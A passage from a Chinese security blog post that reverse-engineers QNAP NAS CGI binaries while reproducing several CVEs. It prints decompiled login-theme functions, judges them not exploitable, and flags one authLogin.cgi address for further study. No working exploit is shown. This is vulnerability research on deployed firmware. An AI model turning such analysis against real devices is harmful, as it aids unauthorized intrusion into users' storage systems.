class="keyword">char</span> s[<span class="number">296</span>]; <span class="comment">// [rsp+4D0h] [rbp-128h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Parameter = CGI_Find_Parameter(a1, <span class="string">&quot;showVersion&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Parameter )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(<span class="keyword">const</span> <span class="keyword">char</span> **)(Parameter + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = strtol(v3, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">      Set_Profile_Integer(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;showVersion&quot;</span>, v4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = CGI_Find_Parameter(a1, <span class="string">&quot;theme&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *(<span class="keyword">const</span> <span class="keyword">char</span> **)(v5 + <span class="number">8</span>);</span><br><span class="line">    v7 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)strtol(v6, <span class="number">0LL</span>, <span class="number">10</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(s, <span class="number">0x100</span>uLL, <span class="string">&quot;%s/%s%d&quot;</span>, <span class="string">&quot;/home/httpd/cgi-bin/loginTheme&quot;</span>, <span class="string">&quot;theme&quot;</span>, <span class="number">1LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !__xstat64(<span class="number">1</span>, s, &amp;stat_buf) )</span><br><span class="line">          v7 = (stat_buf.st_mode &amp; <span class="number">0xF000</span>) != <span class="number">0x4000</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = CGI_Find_Parameter(a1, <span class="string">&quot;bg&quot;</span>);</span><br><span class="line">  v9 = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 &amp;&amp; (v10 = *(<span class="keyword">const</span> <span class="keyword">char</span> **)(v8 + <span class="number">8</span>)) != <span class="number">0LL</span> &amp;&amp; (<span class="keyword">int</span>)strtol(v10, <span class="number">0LL</span>, <span class="number">10</span>) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)strtol(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(v9 + <span class="number">8</span>), <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(filename, <span class="number">0x100</span>uLL, <span class="string">&quot;%s/%s-%d.jpg&quot;</span>, <span class="string">&quot;/home/httpd/cgi-bin/images/desktop&quot;</span>, <span class="string">&quot;desktop&quot;</span>, v11);</span><br><span class="line">    v12 = v7 - ((__xstat64(<span class="number">1</span>, filename, &amp;stat_buf) == <span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v12 = v7 + <span class="number">1</span>;</span><br><span class="line">    LODWORD(v11) = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_404AA4(<span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(v15, <span class="number">0x100</span>uLL, <span class="string">&quot;%s/%s&quot;</span>, <span class="string">&quot;/home/httpd/cgi-bin/loginTheme/html&quot;</span>, <span class="string">&quot;login.html&quot;</span>);</span><br><span class="line">    qnap_exec(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;/bin/cp&quot;</span>, <span class="string">&quot;-rf&quot;</span>, v15, <span class="string">&quot;/home/httpd/cgi-bin/login.html&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(name, <span class="number">0x100</span>uLL, <span class="string">&quot;%s/%s&quot;</span>, <span class="string">&quot;/home/httpd/cgi-bin/loginTheme&quot;</span>, <span class="string">&quot;theme&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !unlink(name) )</span><br><span class="line">      qnap_exec(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;/bin/rm&quot;</span>, <span class="string">&quot;-rf&quot;</span>, name, <span class="number">0LL</span>, v14);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">257</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(s, <span class="number">0x100</span>uLL, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;theme&quot;</span>, <span class="number">1LL</span>);</span><br><span class="line">    symlink(s, name);</span><br><span class="line">    <span class="built_in">snprintf</span>(to, <span class="number">0x100</span>uLL, <span class="string">&quot;%s/%s/%s.jpg&quot;</span>, <span class="string">&quot;/home/httpd/cgi-bin/loginTheme&quot;</span>, <span class="string">&quot;theme&quot;</span>, <span class="string">&quot;desktop&quot;</span>);</span><br><span class="line">    unlink(to);</span><br><span class="line">    symlink(filename, to);</span><br><span class="line">    Set_Profile_Integer(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;LoginBgNum&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11);</span><br><span class="line">    sub_404AA4(<span class="number">1LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重点关注后面的部分删除了一部分功能，这里感觉也成不了漏洞点<br>sub_406BA6和sub_406B2B</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//49</span></span><br><span class="line"><span class="function">__int64 <span class="title">sub_406BA6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> Profile_Integer; <span class="comment">// r12d</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v7; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = json_object_new_object();</span><br><span class="line">  Profile_Integer = Get_Profile_Integer(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;LoginTheme410&quot;</span>, <span class="number">2LL</span>);</span><br><span class="line">  v2 = Get_Profile_Integer(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;LoginBgNum&quot;</span>, <span class="number">1LL</span>);</span><br><span class="line">  v3 = json_object_new_int(Profile_Integer);</span><br><span class="line">  json_object_object_add(v0, <span class="string">&quot;themeNum&quot;</span>, v3);</span><br><span class="line">  v4 = json_object_new_int(v2);</span><br><span class="line">  json_object_object_add(v0, <span class="string">&quot;bgNum&quot;</span>, v4);</span><br><span class="line">  v5 = Get_Profile_Integer(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;showVersion&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  v6 = json_object_new_int(v5);</span><br><span class="line">  json_object_object_add(v0, <span class="string">&quot;showVersion&quot;</span>, v6);</span><br><span class="line">  v7 = (<span class="keyword">const</span> <span class="keyword">char</span> *)json_object_to_json_string(v0);</span><br><span class="line">  <span class="built_in">puts</span>(v7);</span><br><span class="line">  json_object_put(v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//98</span></span><br><span class="line"><span class="function">__int64 <span class="title">sub_406B2B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> Profile_Integer; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = json_object_new_object();</span><br><span class="line">  Profile_Integer = Get_Profile_Integer(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;LoginBgNum&quot;</span>, <span class="number">1LL</span>);</span><br><span class="line">  v2 = json_object_new_int(<span class="number">1LL</span>);</span><br><span class="line">  json_object_object_add(v0, <span class="string">&quot;themeNum&quot;</span>, v2);</span><br><span class="line">  v3 = json_object_new_int(Profile_Integer);</span><br><span class="line">  json_object_object_add(v0, <span class="string">&quot;bgNum&quot;</span>, v3);</span><br><span class="line">  v4 = Get_Profile_Integer(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;showVersion&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  v5 = json_object_new_int(v4);</span><br><span class="line">  json_object_object_add(v0, <span class="string">&quot;showVersion&quot;</span>, v5);</span><br><span class="line">  v6 = (<span class="keyword">const</span> <span class="keyword">char</span> *)json_object_to_json_string(v0);</span><br><span class="line">  <span class="built_in">puts</span>(v6);</span><br><span class="line">  json_object_put(v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>感觉这里也成不了漏洞点，和上面那个变化一样</p>
+<h3 id="others"><a href="#others" class="headerlink" title="others"></a>others</h3><p>authLogin.cgi中的0x41CDAE处感觉可能存在漏洞todo</p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>申明：本文仅限于学术研究或教学用途，旨在促进学术探讨和讨论，并不用于商业用途。<br>1.<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/430145623">https://zhuanlan.zhihu.com/p/430145623</a><br>2.<a target="_blank" rel="noopener" href="https://imnks.com/6471.html">https://imnks.com/6471.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Qnap/" rel="tag"># Qnap</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/03/06/mips-learning/" rel="next" title="mips-learning">
+                <i class="fa fa-chevron-left"></i> mips-learning
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/1652601666778.jpeg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xiquanmuhua.github.io/" title="muhua" target="_blank">muhua</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tianmai1.github.io/" title="tianmai" target="_blank">tianmai</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://makabaka-yyds.github.io/" title="makabaka" target="_blank">makabaka</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lucifer-rossweisse.github.io/" title="Rossweisse" target="_blank">Rossweisse</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lemonprefect.cn/" title="lemon" target="_blank">lemon</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%BA%E4%BB%B6%E3%80%81%E6%8F%92%E4%BB%B6%E8%8E%B7%E5%8F%96%E4%B8%8E%E8%A7%A3%E5%8C%85"><span class="nav-number">2.</span> <span class="nav-text">固件、插件获取与解包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2022-27593"><span class="nav-number">3.1.</span> <span class="nav-text">CVE-2022-27593</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2021-44052"><span class="nav-number">3.2.</span> <span class="nav-text">CVE-2021-44052</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2021-44051"><span class="nav-number">3.3.</span> <span class="nav-text">CVE-2021-44051</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#authLogin-cgi"><span class="nav-number">3.3.1.</span> <span class="nav-text">authLogin.cgi</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#appRequest-cgi"><span class="nav-number">3.3.2.</span> <span class="nav-text">appRequest.cgi</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#change-password-cgi"><span class="nav-number">3.3.3.</span> <span class="nav-text">change_password.cgi</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#disk-manage"><span class="nav-number">3.3.4.</span> <span class="nav-text">disk_manage</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#privRequest"><span class="nav-number">3.3.5.</span> <span class="nav-text">privRequest</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#privWizard"><span class="nav-number">3.3.6.</span> <span class="nav-text">privWizard</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#reset-password"><span class="nav-number">3.3.7.</span> <span class="nav-text">reset_password</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#userConfig"><span class="nav-number">3.3.8.</span> <span class="nav-text">userConfig</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#others"><span class="nav-number">3.4.</span> <span class="nav-text">others</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#References"><span class="nav-number">4.</span> <span class="nav-text">References</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Archer</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" rel="external nofollow noopener" target="_blank" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Gemini
+  </a>
+**  <span id="busuanzi_container_site_pv" class="theme-info">
+&nbsp;&nbsp;|&nbsp;&nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+  <span id="busuanzi_container_site_uv" class="theme-info">
+&nbsp;&nbsp;|&nbsp;&nbsp;本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+**
+</div>
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("LbPELecNVT4mCuCTYHSU2wzm-gzGzoHsz", "iRokzKJjxE22Vs6iknD1dqGA");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
